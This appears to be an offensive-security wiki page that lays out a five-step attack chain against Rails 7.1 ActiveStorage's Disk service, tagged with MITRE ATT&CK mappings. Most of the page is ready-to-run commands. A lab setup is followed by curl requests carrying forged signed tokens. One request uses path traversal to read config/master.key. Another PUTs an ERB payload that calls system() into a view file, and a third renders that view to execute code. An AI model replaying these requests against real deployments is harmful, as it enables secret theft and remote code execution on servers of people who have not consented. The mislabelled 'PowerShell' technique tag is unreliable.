---
tags:
  - path-traversal
  - rails
  - activestorage
  - rce
  - ruby
  - file-read
  - file-write
type: attack_chain
tools:
  - '[[tools/Ruby]]'
  - '[[tools/Rails]]'
  - '[[tools/Bundler]]'
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
complexity: medium
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Vulnerable-Rails-Application]]'
  - '[[procedures/Generate-Signed-Traversal-Tokens]]'
  - '[[procedures/Exploit-Read-Path-Traversal]]'
  - '[[procedures/Exploit-Write-Path-Traversal-for-RCE]]'
  - '[[procedures/Trigger-RCE-via-Tampered-View]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
  - '[[PowerShell]]'
updated_at: '2025-12-14T17:26:22.404Z'
description: >-
  A multi-stage attack exploiting path traversal in Ruby on Rails 7.1
  ActiveStorage Disk service to read sensitive files and write malicious ERB
  templates, resulting in remote code execution.
skill_level: intermediate
impact_level: high
id: d0641779-710b-40e9-96e4-d0075e96f5d6
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
  - '[[PowerShell]]'
---
# Path Traversal in Rails ActiveStorage Disk Service Leading to RCE

Multi-stage attack chain demonstrating exploitation of path traversal in Rails ActiveStorage Disk service to achieve arbitrary file read and write, culminating in remote code execution via malicious ERB template injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Vulnerable App] --> B[Generate Tokens]
    B --> C[Read Sensitive Files]
    C --> D[Write Malicious ERB]
    D --> E[Trigger RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Ruby]]
- [[tools/Rails]]
- [[tools/Bundler]]
- [[tools/curl]]

### Target Environment

- Ruby on Rails 7.1.3 application using ActiveStorage with Disk service
- Production environment with SQLite database
- secret_key_base known or guessable for token crafting
- Port 3000 open for HTTP access

### Initial Access Requirements

- Local access to setup the vulnerable app for testing
- Network access to the running Rails server (http://0.0.0.0:3000)
- No prior credentials needed; exploits public-facing endpoints

## Detailed Attack Procedures

### Step 1: Setup Vulnerable Rails Application
procedure: [[procedures/Setup-Vulnerable-Rails-Application]]

**Objective**: Create and configure a vulnerable Rails 7.1 app with ActiveStorage Disk service in production mode.

**Instructions**: Verify Ruby version using [[commands/ruby-version-check]]:

```bash
ruby -v
```

Create new app with [[commands/rails-new-app]]:

```bash
rails new disk_traversal_7_1 -G -M -C -A -J -T
```

Install ActiveStorage with [[commands/rails-activestorage-install]]:

```bash
bin/rails active_storage:install
```

Migrate database using [[commands/rails-db-migrate]]:

```bash
RAILS_ENV=production bin/rails db:migrate
```

Configure production.rb to set message_serializer to :json, then start server with [[commands/rails-server-start]]:

```bash
RAILS_ENV=production bundle exec rails s
```

**Expected Output**: Server running on http://0.0.0.0:3000.

**Success Indicators**:
- Ruby version 3.2.3 or compatible confirmed
- Rails app created and server accessible
- Database migrated successfully

### Step 2: Generate Signed Traversal Tokens
procedure: [[procedures/Generate-Signed-Traversal-Tokens]]

**Objective**: Craft signed MessageVerifier tokens using the app's secret_key_base to enable path traversal in blob keys.

**Instructions**: Run the traversal script with [[commands/rails-runner-traversal]]:

```bash
RAILS_ENV=production bundle exec rails runner traversal.rb
```

**Expected Output**: Generated read and write tokens, along with corresponding curl commands for exploitation.

**Success Indicators**:
- Tokens outputted successfully
- Payloads include '../' sequences for traversal

### Step 3: Exploit Read Path Traversal
procedure: [[procedures/Exploit-Read-Path-Traversal]]

**Objective**: Read arbitrary files outside the storage directory, such as config/master.key.

**Instructions**: Use the generated read token with [[commands/curl-read-traversal]]:

```bash
curl "http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLy4vLi4vY29uZmlnL21hc3Rlci5rZXkiLCJkaXNwb3NpdGlvbiI6ImlubGluZSIsImNvbnRlbnRfdHlwZSI6InRleHQvcGxhaW4iLCJzZXJ2aWNlX25hbWUiOiJkaXNrIn0sInB1ciI6ImJsb2Jfa2V5In19--73bb9947997d2e2377b31f2bedd0a056f58deff7/test"
```

**Expected Output**: Contents of the master.key file displayed.

**Success Indicators**:
- Sensitive file contents retrieved
- No authentication or errors in response

### Step 4: Exploit Write Path Traversal for RCE
procedure: [[procedures/Exploit-Write-Path-Traversal-for-RCE]]

**Objective**: Write a malicious ERB template to a view file using path traversal.

**Instructions**: Upload the payload with the generated write token using [[commands/curl-write-traversal]]:

```bash
curl -X PUT -H "Content-type: text/plain" -d "<% system('date') %>" http://0.0.0.0:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsiZGF0YSI6eyJrZXkiOiIuLi9hcHAvdmlld3MvdXNlcnMvc2hvdy50ZXh0LmVyYiIsImRpc3Bvc2l0aW9uIjoiaW5saW5lIiwiY29udGVudF90eXBlIjoidGV4dC9wbGFpbiIsImNvbnRlbnRfbGVuZ3RoIjoyMCwic2VydmljZV9uYW1lIjoiZGlzayJ9LCJwdXIiOiJibG9iX3Rva2VuIn19--e4155a875021a762826b6240c24659acd99a738e
```

**Expected Output**: HTTP 200 or 201 response indicating successful write.

**Success Indicators**:
- File written to ../app/views/users/show.text.erb
- No server errors during upload

### Step 5: Trigger RCE via Tampered View
procedure: [[procedures/Trigger-RCE-via-Tampered-View]]

**Objective**: Render the tampered view to execute the injected ERB code for RCE.

**Instructions**: Access the endpoint to trigger rendering, using [[commands/curl-trigger-rce]] or browser:

```bash
curl http://0.0.0.0:3000/users/show
```

**Expected Output**: Output from system('date') command, showing current date and time.

**Success Indicators**:
- Command execution confirmed in response
- RCE achieved without direct shell access

## Attack Chain Summary

### Key Achievements

1. Arbitrary file read from sensitive locations like config/master.key
2. Arbitrary file write to inject malicious ERB templates
3. Remote code execution via rendered tampered views

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery
- [[PowerShell]] Command and Scripting Interpreter (Ruby/ERB)

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---

*Last updated: 2024-01-01T00:00:00Z*
